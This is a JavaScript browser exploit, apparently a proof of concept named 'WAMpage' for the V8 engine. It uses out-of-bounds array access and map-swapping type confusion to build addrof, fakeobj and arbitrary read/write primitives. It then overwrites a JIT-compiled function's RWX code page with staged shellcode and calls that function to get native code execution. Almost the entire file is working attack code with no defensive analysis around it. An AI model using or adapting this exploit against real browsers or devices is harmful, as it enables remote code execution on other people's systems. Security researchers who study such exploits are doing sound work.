var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);

// float64 => [uint32, uint32]
function ftoi(val) {
	f64_buf[0] = val;
	return [u32_buf[0], u32_buf[1]];
}

// [uint32, uint32] => float64
function itof(a, b) {
	u32_buf[0] = a;
	u32_buf[1] = b;
	return f64_buf[0];
}

function hex(n) {
	return "0x" + n.toString(16);
}

function wampage() {
	log("[+] Starting WAMpage...").then(() => {

	// give friendlier names to our variables from the snapshot blob
	var overflow1 = oob1[0];
	var arr1      = oob1[1];
	var overflow2 = oob2[0];
	var arr2      = oob2[1];

	// use oob reads to get pointers to <Map(FAST_DOUBLE_ELEMENTS)> and <Map(FAST_ELEMENTS)>
	var fast_double_elements_map = overflow1[0x137];
	var fast_elements_map = overflow2[0x139];
	//%DebugPrint(fast_double_elements_map);
	//%DebugPrint(fast_elements_map);


	function addrof(obj) {
		// we write the data as an Element (i.e. a pointer)
		overflow1[0x137] = fast_elements_map;
		arr1[0] = obj;

		// and then cause type confusion to read it as a double, which lets us retreive the address
		overflow1[0x137] = fast_double_elements_map;
		var addr = ftoi(arr1[0])[0];
		return addr;
	}

	function fakeobj(addr) {
		addr |= 1; // set the low bit to mark it as a heap object

		// write as a double
		overflow1[0x137] = fast_double_elements_map;
		arr1[0] = itof(addr, addr);

		// read as an object
		overflow1[0x137] = fast_elements_map;
		var obj = arr1[0];

		// revert to doubles because this probably makes gc happier
		overflow1[0x137] = fast_double_elements_map;

		return obj;
	}

	// test addrof and fakeobj

	var myobj = {"foo": "bar"};
	var myobj_addr = addrof(myobj);

	log("[+] addrof(myobj) = " + hex(myobj_addr)).then(() => {

	// just to exercise things
	addrof("test");

	var myobj2 = fakeobj(myobj_addr);

	log("[+] Test: reconstructed myobj: " + JSON.stringify(myobj2)).then(() => {

	// construct arbread/arbwrite primitives

	//                map
	var floatarray = [itof(addrof(fast_double_elements_map), 8), 1.2, 1.3, 1.4];
	var fake = fakeobj(addrof(floatarray)+(8*4));

	function arbread32(addr) {
		floatarray[1] = itof((addr-8)|1, 8); // fake fixedarray
		var result = ftoi(fake[0])[0];
		floatarray[1] = itof(addrof(fast_double_elements_map), 8); // put a valid pointer back to make gc happy
		return result;
	}

	function arbwrite32(addr, val) {
		floatarray[1] = itof((addr-8)|1, 8); // fake fixedarray
		var second = ftoi(fake[0])[1];
		fake[0] = itof(val, second);
		floatarray[1] = itof(addrof(fast_double_elements_map), 8); // put a valid pointer back to make gc happy
	}

	// load stage2 shellcode into page-aligned memory (RW memory for now, stage1 will make it RWX)
	var big_shellcode = new Uint8Array(0x4000);
	var buf_start = arbread32(arbread32(addrof(big_shellcode) + 4*2) + 4*3);
	var buf_offset = 0x1000 - (buf_start % 0x1000);
	var stage2_shellcode_ptr = buf_start + buf_offset;

	Base64Binary.decode(stage2_shellcode_b64, big_shellcode, buf_offset);

	// stage1 needs to call stage2, this tells it where stage2 is
	stage1_shellcode[stage1_shellcode.length - 1] = stage2_shellcode_ptr;

	log("[+] stage2 shellcode loaded @ " + hex(stage2_shellcode_ptr)).then(() => {

	// set up some RWX memory

	function myfunc(a) {
		return (a + 0xdeadbeef) | 0;
	}

	for (var i=0; i<100000; i++) myfunc(i); // jit warmup

	var myfunc_addr = addrof(myfunc);

	log("[+] myfunc @ " + hex(myfunc_addr)).then(() => {

	var function_code = arbread32(myfunc_addr + 4*7);

	log("[+] stage1 RWX buf @ " + hex(function_code)).then(() => {

	var foo = new Uint32Array(stage1_shellcode.length);
	var backing_buf = arbread32(addrof(foo) + 4*2);
	var ptr_addr = backing_buf + 4*2;
	var ptr = arbread32(ptr_addr);
	arbwrite32(ptr_addr, (function_code - 0x10) | 1); // patch foo so that its backing buffer is our rwx page

	// we could just do this with repated arbwrite32()'s, but for some reason
	// I couldn't get that to work - my shellcode was getting called from
	// somewhere before the copy was complete...
	for (var i = 0; i < stage1_shellcode.length; i++) {
		foo[i] = stage1_shellcode[i];
	}

	arbwrite32(ptr_addr, ptr); // put it back to keep the heap clean

	log("[+] Copied stage1 shellcode. Calling...").then(() => {

	// pwnage time
	myfunc();

	// nested callbacks from my janky logging function, lol
	});});});});});});});
}

if (typeof window === "undefined") { // we're running in d8 instead of a real browser
	wampage();
}
